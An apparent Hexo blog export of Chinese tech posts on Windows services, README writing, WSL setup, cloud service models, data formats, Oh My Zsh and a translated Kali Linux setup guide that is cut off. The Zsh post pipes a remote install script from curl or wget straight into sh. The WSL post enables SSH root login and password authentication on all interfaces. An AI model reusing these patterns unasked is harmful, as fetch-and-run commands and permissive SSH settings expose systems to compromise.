<p>关闭不必要的服务：<br>Windows 默认会启动多个服务，可以在<strong>计算机管理</strong>的<strong>服务</strong>中禁用相关服务，下面列出了一些可以禁用的服务：</p>
<ul>
<li>COM+ Event System</li>
<li>Computer Browser</li>
<li>Distributed Link Tracking Client</li>
<li>Routing and Remote Access</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>编写规范的 README 文档</title>
    <url>/2018/11/02/write-standard-readme/</url>
    <content><![CDATA[<p>代码不仅是写给计算机的，也是写给人的，一篇文档的好坏直接影响着使用此代码的人的心情，针对小的项目，一般使用 <strong>README</strong> 文件来做整体描述，README 这个名字也极好的反映了此文件的目的，即“<strong>读我</strong>”。有趣的是，README 这 6 个字母通常都是大写的，这是因为<strong>在 Linux 中大写的文件名往往意味着醒目和值得注意</strong>。实际上，并没有任何人规定 README 文档应该写成什么样子，但在本文中，我将介绍一些被公认的所谓优秀的 README 文档应该是什么样子的。</p>
<a id="more"></a>
<p>README 文档通常是用 <strong>Markdown</strong> 编写的，但有时你也会看到其他格式的 README 文档，比如：有关 Python 的项目喜欢用 <strong>reStructuredText</strong> 编写 README 文档，这也是一种类似于 Markdown 的标记语言。一个优秀的 README 文档中应包含：<strong>简短的项目说明</strong>、<strong>安装说明</strong>、<strong>使用说明</strong>、<strong>如何参与贡献</strong>、<strong>许可协议</strong>等。此外，随着代码量的增加，<strong>已知 BUG</strong>、<strong>常见问题</strong>等也可以加入到 README 文档中。</p>
<p>一个规范的 README 文档模板应该像下面这样的：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># Project Name</span></span><br><span class="line">填写简短的项目说明</span><br><span class="line"><span class="section"># Installation</span></span><br><span class="line">填写安装说明</span><br><span class="line"><span class="section"># Usage</span></span><br><span class="line">填写使用说明</span><br><span class="line"><span class="section"># Contributing</span></span><br><span class="line">填写如何参与此项目的贡献方法</span><br><span class="line"><span class="section"># License</span></span><br><span class="line">填写许可协议</span><br></pre></td></tr></table></figure>

<p>有趣的是，在日常使用中，经常会见到各种各样的徽章或进度条，比如：</p>
<p><img src="https://img.shields.io/travis/rust-lang/rust.svg" alt="Travis (.org)"></p>
<p><img src="https://img.shields.io/github/release/qubyte/rubidium.svg" alt="GitHub release"></p>
<p><img src="https://img.shields.io/github/stars/git/git.svg" alt="GitHub stars"></p>
<p>它们的本质就是一个个的图片而已，要想自定义这些图片可以访问 <a href="https://shields.io/#/">Shields.io</a>。</p>
<p>最后，我将给出几个 GitHub 中项目的文档，它们的 README 文档都写得不错：</p>
<ul>
<li><a href="https://github.com/rails/rails">Rails</a></li>
<li><a href="https://github.com/thoughtbot/factory_bot">factory_bot</a></li>
<li><a href="https://github.com/meolu/walle-web">Walle</a></li>
<li><a href="https://github.com/github/ledbetter">Ledbetter</a></li>
<li><a href="https://github.com/udacity/create-your-own-adventure">Create-Your-Own-Adventure</a></li>
<li><a href="https://github.com/zkat/can.viewify">can.viewify</a></li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>WSL相关问题解决</title>
    <url>/2018/08/21/wsl-problem/</url>
    <content><![CDATA[<h2 id="名称问题"><a href="#名称问题" class="headerlink" title="名称问题"></a>名称问题</h2><p>最早这个项目命名为<strong>Bash on Ubuntu on Windows</strong>，随后改名为<strong>Windows Subsystem for Linux</strong>，即<strong>WSL</strong>，值得肯定的是，随着Windows 10逐渐更新，慢慢统一了命名。</p>
<h2 id="安装及运行"><a href="#安装及运行" class="headerlink" title="安装及运行"></a>安装及运行</h2><p>在安装前，需要在<strong>启动或关闭Windows功能</strong>中勾选<strong>适用于Linux的Windows子系统</strong>，或者直接在管理员权限的PowerShell中输入<code>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</code>此条命令，也能达到同样的效果。<br>完成上述操作后，可直接在<strong>Microsoft Store</strong>中搜索Linux，到本文书写为止，商店中已经有Ubuntu、SUSE、Debian、Kali等Linux发行版，个人建议下载Ubuntu。<br>到Ubuntu的下载页，可以看到发布者为Canonical公司，这也正是Ubuntu的维护公司，值得注意的是，Canonical公司还发布了特定版本的Ubuntu系统，例如Ubuntu 16.04 LTS、Ubuntu 18.04 LTS等，个人建议直接下载无版本号的Ubuntu，而不要下载特定版本的Ubuntu，因为无版本号的Ubuntu会在新版本Ubuntu发布之后切换到最新版，所以它始终指向最新的Ubuntu。同时请注意，应用商店里Ubuntu软件的更新并不会升级Ubuntu版本，如果你恰好安装的是旧版本，想要升级到新版本，可以在WSL中运行<code>do-release-upgrade</code>命令升级到最新版。<br>下载完成后，要启动Ubuntu有多种方式，可以在<strong>PowerShell</strong>或<strong>cmd</strong>中输入<code>wsl</code>或<code>bash</code>或<code>ubuntu</code>都可启动，也可以直接在<strong>开始菜单</strong>中点击Ubuntu图标启动。</p>
<a id="more"></a>
<h2 id="SSH问题"><a href="#SSH问题" class="headerlink" title="SSH问题"></a>SSH问题</h2><p>要想在WSL中开启SSH服务，需要在配置文件(/etc/ssh/sshd_config)中作如下修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Port 2222  <span class="comment">#将22改为2222，因Win10中自带的SSH服务也在监听22端口</span></span><br><span class="line">ListenAddress 0.0.0.0  <span class="comment">#取消注释，监听所有端口</span></span><br><span class="line">UsePrivilegeSeparation no  <span class="comment">#将yes修改为no</span></span><br><span class="line">PermitRootLogin yes  <span class="comment">#将prohibit-password修改为yes，允许root用户登录，视个人情况而定</span></span><br><span class="line">PasswordAuthentication yes  <span class="comment">#将no修改为yes，允许密码登录</span></span><br></pre></td></tr></table></figure>
<p>修改完成后用<code>sudo service ssh start</code>启动SSH服务，可能会报如下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Could not load host key: /etc/ssh/ssh_host_rsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_dsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">Could not load host key: /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>
<p>并且此时无法使用SSH客户端连接到服务器端，客户端会报如下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Connection closed by 127.0.0.1 port 2222</span><br></pre></td></tr></table></figure>
<p>造成这种情况的原因是服务端在启动SSH服务时发现加密过程中需要用到的密钥文件未找到，可依次用如下命令生成所需文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span><br><span class="line">ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</span><br><span class="line">ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>
<p>其中<code>-t</code>参数表示加密类型，<code>-f</code>参数表示生成的密钥文件名，错误信息中缺少什么密钥按需生成即可。之后再重新启动SSH服务即可正常工作。</p>
<h2 id="图形界面问题"><a href="#图形界面问题" class="headerlink" title="图形界面问题"></a>图形界面问题</h2><p>在你当前所使用的shell的配置文件里（比如<code>.bashrc</code>或<code>.zshrc</code>），添加如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export DISPLAY&#x3D;localhost:0</span><br></pre></td></tr></table></figure>
<p>随后打开X Server客户端（比如<a href="https://sourceforge.net/projects/xming/">Xming</a>或<a href="https://sourceforge.net/projects/vcxsrv/">VcXsrv</a>）并将Display项设为0即可运行图形化应用。笔者所使用的是<a href="https://mobaxterm.mobatek.net/">MobaXterm</a>，其设置路径为<strong>Settings</strong> —&gt; <strong>Configuration</strong> —&gt; <strong>X11</strong> —&gt; <strong>Display offset</strong>。</p>
<h2 id="EXE程序问题"><a href="#EXE程序问题" class="headerlink" title="EXE程序问题"></a>EXE程序问题</h2><h2 id="netstat和ps"><a href="#netstat和ps" class="headerlink" title="netstat和ps"></a>netstat和ps</h2><h2 id="后台运行问题"><a href="#后台运行问题" class="headerlink" title="后台运行问题"></a>后台运行问题</h2><h2 id="无法使用的软件"><a href="#无法使用的软件" class="headerlink" title="无法使用的软件"></a>无法使用的软件</h2><p>以下软件在 WSL 中暂时无法正常使用：</p>
<ul>
<li><code>nmap</code>，详情请参见 <a href="https://github.com/microsoft/WSL/issues/1349">nmap not working</a>。</li>
<li><code>proxychains</code></li>
</ul>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>有关WSL的更多内容，可以查看<a href="https://docs.microsoft.com/zh-cn/windows/wsl/about">WSL官方文档</a>，或者<a href="https://blogs.msdn.microsoft.com/wsl/">WSL官方博客</a>，在使用WSL的过程中遇到任何问题，可以去<a href="https://github.com/Microsoft/WSL">WSL的GitHub地址</a>提Issues。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务的三种模式</title>
    <url>/2018/07/15/xaas/</url>
    <content><![CDATA[<p>云服务的模式一般有 IaaS、PaaS、SaaS 三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。</p>
<h2 id="IaaS"><a href="#IaaS" class="headerlink" title="IaaS"></a>IaaS</h2><p><strong>IaaS</strong>，Infrastructure as a Service（基础设施即服务），云服务的最底层，服务商提供操作系统、存储设施、硬件配置等资源，典型的例子是 <strong>VPS</strong>，即 Virtual Private Server（虚拟专用服务器），这类服务一般提供必要的 Shell 接口，可使用户连接到操作系统进行相关配置，常见的 VPS 厂商有 <a href="https://aws.amazon.com/cn/ec2/">Amazon EC2</a>、<a href="https://www.aliyun.com/product/ecs">阿里云 ECS</a> 等。</p>
<h2 id="PaaS"><a href="#PaaS" class="headerlink" title="PaaS"></a>PaaS</h2><p><strong>PaaS</strong>，Platform as a Service（平台即服务），云服务的中间层，服务商提供必要的应用，用户无权访问操作系统及硬件等资源，典型的例子是<strong>虚拟空间</strong>，这类服务一般会提供必要的 Web 服务器、数据库等，用户可以直接在其上部署 Web 应用，常见的 PaaS 厂商有 <a href="https://cloud.google.com/appengine/">Google App Engine(GAE)</a>、<a href="https://www.heroku.com/">Heroku</a> 等。</p>
<h2 id="SaaS"><a href="#SaaS" class="headerlink" title="SaaS"></a>SaaS</h2><p><strong>SaaS</strong>，Software as a Service（软件即服务），云服务的最高层，直接提供现成的应用供用户使用，用户所付出的精力最少，例如本站采用的 Hexo、WordPress 等。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>XML、JSON与YAML</title>
    <url>/2018/07/21/xml-json-yaml/</url>
    <content><![CDATA[<p>XML、JSON与YAML是三种常见的信息标记形式，这三者由于其特有的属性而在不同的领域广为使用。</p>
<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>XML</strong>，Extensible Markup Language(可扩展标记语言)，倘若我要表示某个人的简要信息，用XML可写为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;person&gt;</span><br><span class="line">    &lt;firstName&gt;Tian&lt;&#x2F;firstName&gt;</span><br><span class="line">    &lt;lastName&gt;Song&lt;&#x2F;lastName&gt;</span><br><span class="line">    &lt;address&gt;</span><br><span class="line">        &lt;streetAddr&gt;中关村南大街5号&lt;&#x2F;streetAddr&gt;</span><br><span class="line">        &lt;city&gt;北京市&lt;&#x2F;city&gt;</span><br><span class="line">        &lt;zipcode&gt;100081&lt;&#x2F;zipcode&gt;</span><br><span class="line">    &lt;&#x2F;address&gt;</span><br><span class="line">    &lt;prof&gt;Computer System&lt;&#x2F;prof&gt;&lt;prof&gt;Security&lt;&#x2F;prof&gt;</span><br><span class="line">&lt;&#x2F;person&gt;</span><br></pre></td></tr></table></figure>

<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><strong>JSON</strong>，JavaScript Object Notation(JavaScript对象表示法)，倘若我要表示某个人的简要信息，用JSON可写为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;firstName&quot; : &quot;Tian&quot;,</span><br><span class="line">    &quot;lastName&quot; : &quot;Song&quot;,</span><br><span class="line">    &quot;address&quot; : &#123;</span><br><span class="line">                    &quot;streetAddr&quot; : &quot;中关村南大街5号&quot;,</span><br><span class="line">                    &quot;city&quot; : &quot;北京市&quot;,</span><br><span class="line">                    &quot;zipcode&quot; : &quot;100081&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">    &quot;prof&quot; : [&quot;Computer System&quot;, &quot;Security&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h2><p><strong>YAML</strong>，在开发这种语言之初，其意为Yet Another Markup Language(仍是一种标记语言)，之后为了强调这种语言以数据作为中心，而不是以标记语言为重点，故解释为YAML Ain&#39;t a Markup Language(YAML不是一种标记语言)，倘若我要表示某个人的简要信息，用YAML可写为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firstName : Tian</span><br><span class="line">lastName : Song</span><br><span class="line">address : </span><br><span class="line">    streetAddr : 中关村南大街5号</span><br><span class="line">    city : 北京市</span><br><span class="line">    zipcode : 100081</span><br><span class="line">prof : </span><br><span class="line">-Computer System</span><br><span class="line">-Security</span><br></pre></td></tr></table></figure>

<h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>XML是最早的通用信息标记语言，可扩展性好，但繁琐，主要用于Internet上的信息交互与传递，以及用户界面的编写，比如Android；JSON中的信息有类型，适合程序处理(js)，较XML简洁，主要用于移动应用云端和节点的信息通信，无注释；YAML信息无类型，文本信息比例最高，可读性好，主要用于各类系统的配置文件，有注释易读。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用 Zsh 替代 Bash</title>
    <url>/2018/09/18/zsh/</url>
    <content><![CDATA[<p>众所周知，Bash 几乎是所有 Linux 发行版预装的 Shell，但 Zsh 却能带给你更强大的功能。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先，执行 <code>echo $SHELL</code> 可以查看你当前所使用的 Shell，如果不是 Zsh，则可以接着执行 <code>cat /etc/shells</code> 查看你当前系统所支持的 Shell，如果里面没有 Zsh（在 macOS 中是自带 Zsh 的），则你需要下载安装 Zsh，在 Ubuntu 中，只需要 <code>sudo apt install zsh</code> 一条命令即可，启用也很简单，<code>chsh -s $(which zsh)</code> 即可（执行完此命令后通常需要重启一下才能生效），但它的配置却相当复杂，由此诞生了 <a href="https://ohmyz.sh/">Oh My Zsh</a> 项目，该项目的主要目的是简化 Zsh 的配置。</p>
<p>Oh My Zsh 的官网给出了利用 <code>curl</code> 或 <code>wget</code> 安装的详细命令，具体如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装 Oh My Zsh 前需要安装 git（`sudo apt install git`）</span></span><br><span class="line"><span class="comment"># 通过 curl 安装</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment"># 通过 wget 安装</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>安装完成后，会在当前用户的家目录下生成多个隐藏文件：<br>其中 <code>.zshrc</code> 类似于 <code>.bashrc</code>，存放 zsh 的配置信息；<br><code>.zsh_history</code> 类似于 <code>.bash_history</code>，存放 zsh 的命令历史记录；<br><code>.oh-my-zsh</code> 的文件夹则是 Oh My Zsh 项目 GitHub 仓库的克隆版，其中的 <code>themes</code> 文件夹下主要存放自带的主题，<code>plugins</code> 文件夹下主要存放自带的插件，<code>custom</code> 文件夹下主要存放用户自己下载的主题和插件。</p>
<a id="more"></a>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Oh My Zsh 的主要配置都位于 <code>$HOME/.zshrc</code> 文件中，主要配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置主题，默认为自带的 robbyrussell 主题，</span></span><br><span class="line"><span class="comment"># 个人喜欢自带的 ys 主题</span></span><br><span class="line">ZSH_THEME=<span class="string">&quot;ys&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动错误命令自动更正，默认是注释的</span></span><br><span class="line">ENABLE_CORRECTION=<span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在命令执行的过程中，使用小红点进行提示</span></span><br><span class="line"><span class="comment"># 默认是注释的</span></span><br><span class="line">COMPLETION_WAITING_DOTS=<span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置插件，默认只启用了自带的 git 插件,</span></span><br><span class="line"><span class="comment"># 要启用更多的插件可直接在括号中写入，</span></span><br><span class="line"><span class="comment"># 必须是自带的插件或已下载到指定位置的插件</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Zsh 的强大之处就在于它有相当多的插件，只需安装相关插件，并进行配置，即可体验相应功能。Oh My Zsh 安装并启用插件相当简便，所以，可把 Oh My Zsh 当成是一个 Zsh 的插件管理器。个人常用的插件如下：</p>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>Oh My Zsh 自带的插件，用于显示 Git 仓库的分支等信息。</p>
<h3 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h3><p>Oh My Zsh 自带的插件，实现快速跳转到指定文件夹，前提是要安装 autojump 命令行工具，<code>sudo apt install autojump</code> 即可。</p>
<h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a><a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions</a></h3><p>Zsh 下的命令自动建议插件，使用如下命令即可安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<h3 id="zsh-completions"><a href="#zsh-completions" class="headerlink" title="zsh-completions"></a><a href="https://github.com/zsh-users/zsh-completions">zsh-completions</a></h3><p>Zsh 下的命令自动补全插件，使用如下命令即可安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-completions ~/.oh-my-zsh/custom/plugins/zsh-completions</span><br></pre></td></tr></table></figure>

<h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a><a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting</a></h3><p>Zsh 下的命令语法高亮插件，使用如下命令即可安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<p>当安装并启用以上的所有插件后，<code>$HOME/.zshrc</code> 文件中插件相关配置应该是下面这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  autojump</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-completions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"><span class="built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line"><span class="comment"># 值得注意的是，根据官方文档，zsh-syntax-highlighting 插件需放在最后，</span></span><br><span class="line"><span class="comment"># 并且要加上相应的 source 语句</span></span><br></pre></td></tr></table></figure>

<h2 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h2><p>Oh My Zsh 自带了很多主题，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes">在这里</a>可以查看每个主题的显示效果，可根据自己的喜好选择合适的主题，值得注意的是，当在 <code>$HOME/.zshrc</code> 配置文件中将主题设置为 <code>random</code> 时，它每次会选择随机的主题。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>安装 Kali Linux 后要做的 10 件事</title>
    <url>/2019/02/25/after-kali/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/">https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/</a> ，正文如下：</p>
<p>默认情况下，对于完成日常的渗透测试，<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-getting-started-with-kali-your-new-hacking-system-0151631/">Kali Linux</a> 可能没有你所需的一切。但通过一些提示，技巧和应用程序，我们可以像专业的白帽子一样快速开始使用 Kali。</p>
<p>大多数 Linux 发行版都是高度可定制的。这使得个性化你的渗透测试发行版有点令人生畏。只需几个命令，我们就可以自动执行任务，安装我们喜欢的软件，创建其他用户帐户，正确配置匿名软件，以及优化我们与终端的互动。我们可以采取一些措施来改善与操作系统的交互。</p>
<a id="more"></a>
<div class="video-container"><iframe src="https://www.youtube.com/embed/8VL0K0rFgxw" frameborder="0" loading="lazy" allowfullscreen></iframe></div>

<h2 id="1、安装-Git"><a href="#1、安装-Git" class="headerlink" title="1、安装 Git"></a>1、安装 Git</h2><p><a href="https://git-scm.com/">Git</a> 是一个开源软件版本控制应用程序。它可以用于协作共享和编辑代码，但在 Null Byte 中通常被引用作为复制（或“<a href="https://www.git-scm.com/docs/git-clone">克隆</a>”）GitHub 上的代码存储库的主要工具。Git 是渗透测试人员必备的工具，他们希望将自己的工具集扩展到默认 Kali 存储库中可用的工具集之外。</p>
<p>可以使用下面的 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-5-installing-new-software-0147591/">apt-get</a> 命令安装 Git。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure>

<h2 id="2、配置-Bash-别名"><a href="#2、配置-Bash-别名" class="headerlink" title="2、配置 Bash 别名"></a>2、配置 Bash 别名</h2><p>Bash 别名非常适合创建自定义命令行快捷方式。例如，我们可以重新分配 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-2-creating-directories-files-0147234/">ls</a> 命令以自动使用我们最喜欢的参数。下面是正常 <strong>ls</strong> 输出的示例。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line"> androidbins.txt                                      folder-pictures.png     smtp.cracked         text-x-generic.png</span><br><span class="line"> bogus_gmail.creds                                    folder.png              smtp.list            Windows-10</span><br><span class="line"> dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39   package-x-generic.png   text-x-generic.ico  <span class="string">&#x27;Windows 10 Icons&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在创建 <strong>ls</strong> 别名后再次输出的示例。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line">total 220K</span><br><span class="line">-rw-------  1 root root  15K Aug 24  2015  folder-pictures.png</span><br><span class="line">-rw-------  1 root root 8.7K Aug 24  2015  folder.png</span><br><span class="line">-rw-------  1 root root  11K Aug 24  2015  package-x-generic.png</span><br><span class="line">-rw-------  1 root root 5.5K Sep  3  2015  text-x-generic.png</span><br><span class="line">drwxr-xr-x 12 root root 4.0K May 31 00:44 <span class="string">&#x27;Windows 10 Icons&#x27;</span>/</span><br><span class="line">drwxr-xr-x 18 root root 4.0K May 31 00:44  Windows-10/</span><br><span class="line">-rwxr-x---  1 root root 103K May 31 00:49  text-x-generic.ico*</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jun 11 21:57  dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39/</span><br><span class="line">-rw-r--r--  1 root root   52 Jul  5 18:13  bogus_gmail.creds</span><br><span class="line">-rw-r--r--  1 root root  15K Jul  5 18:28  smtp.list</span><br><span class="line">-rw-r--r--  1 root root  181 Jul  5 18:43  smtp.cracked</span><br><span class="line">-rw-r--r--  1 root root  23K Jul 23 18:18  androidbins.txt</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jul 23 19:22  ./</span><br><span class="line">drwxr-xr-x 23 root root 4.0K Aug  9 04:25  ../</span><br></pre></td></tr></table></figure>

<p>我们得到了更详细的输出。<strong>ls</strong> 命令现在自动使用 <strong>-l</strong>，**-a<strong>，</strong>-t<strong>，</strong>-h** 和 <strong>-r</strong> 参数。所有这些参数都将指示 <strong>ls</strong> 使用列表（**-l<strong>）格式，列出所有（</strong>-a<strong>）文件 —— 包括隐藏文件 —— 并以人类可读（</strong>-h**）的格式打印文件大小（例如，1K，234M，5G）。</p>
<p>我的别名还将按修改时间（**-t<strong>）对输出进行排序，并反转（</strong>-r<strong>）列表的顺序，以便最近修改的文件出现在终端的底部。这个参数集合是我个人的 **ls</strong> 偏好，但你的可能会有所不同。</p>
<p>要创建别名，请使用 <strong>nano</strong> 或你喜欢的文本编辑器打开 <code>/root/.bash_aliases</code>。添加以下行以创建别名。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/intro-vim-unix-text-editor-every-hacker-should-be-familiar-with-0174674/">Vim 简介，每个黑客都应该知道的 Unix 文本编辑器</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ls=<span class="string">&#x27;ls --color=always -rthla&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们还可以进一步向 <code>.bash_aliases</code> 文件添加更复杂的函数。下面是一个简单的函数示例，旨在使 Kali 保持最新状态。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> apt-updater &#123;</span><br><span class="line">    apt-get update &amp;&amp;</span><br><span class="line">    apt-get dist-upgrade -Vy &amp;&amp;</span><br><span class="line">    apt-get autoremove -y &amp;&amp;</span><br><span class="line">    apt-get autoclean &amp;&amp;</span><br><span class="line">    apt-get clean &amp;&amp;</span><br><span class="line">    reboot</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>保存对 <code>.bash_aliases</code> 文件所做的更改后，打开一个新终端以使更改生效。运行新创建的 <strong>apt-updater</strong> 函数将调用一系列 <strong>apt-get</strong> 命令，这些命令将自动更新和维护你的系统。如果先前的命令失败，＆ 符号（**&amp;&amp;**）确保该函数不会继续执行以下命令。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-updater</span><br></pre></td></tr></table></figure>

<p>有关 Bash 别名的更多信息，请查看 Kody 的“<a href="https://null-byte.wonderhowto.com/how-to/mac-for-hackers-set-up-macos-system-for-wi-fi-packet-capturing-0186354/">为 Wi-Fi 数据包捕获设置 MacOS 系统</a>”一文。</p>
<h2 id="3、创建一个新的低权限用户"><a href="#3、创建一个新的低权限用户" class="headerlink" title="3、创建一个新的低权限用户"></a>3、创建一个新的低权限用户</h2><p>许多应用程序（如 Chromium 浏览器和 Tor 浏览器）都不应该以 root 用户身份打开或使用。此类应用程序在很大程度上依赖于低级别权限来提供某种程度的安全性。某些用户为这些活动创建低特权用户帐户可能是有益的。</p>
<p>Takhion 的“<a href="https://null-byte.wonderhowto.com/how-to/install-lock-down-kali-linux-for-safe-desktop-use-0184531/#jump-step2">锁定 Kali Linux 以用于安全桌面使用</a>”一文中详细介绍了这一概念，因此请务必查看帮助。</p>
<h2 id="4、安装一个终端复用器"><a href="#4、安装一个终端复用器" class="headerlink" title="4、安装一个终端复用器"></a>4、安装一个终端复用器</h2><p>复用器是一种平铺终端仿真器，允许我们在一个窗口内打开多个终端会话。这样做的主要好处是能够立即看到我们所有打开的终端会话，而不是将窗口叠加在一起。以下是复用器示例。</p>
<p><img src="https://img.wonderhowto.com/img/10/19/63669458451029/0/top-10-things-do-after-installing-kali-linux.w1456.jpg" alt="复用器"></p>
<p>有许多值得注意的复用器。如上面的屏幕截图所示，<a href="https://github.com/gnunn1/tilix">Tilix</a> 是一个开源且可靠的选项。替代方案包括 <a href="https://github.com/tmux/tmux/">tmux</a> 和 <a href="https://savannah.gnu.org/projects/screen">screen</a>。</p>
<p>Tilix 可在 Kali 的 APT 存储库中使用，可以使用以下命令进行安装。</p>
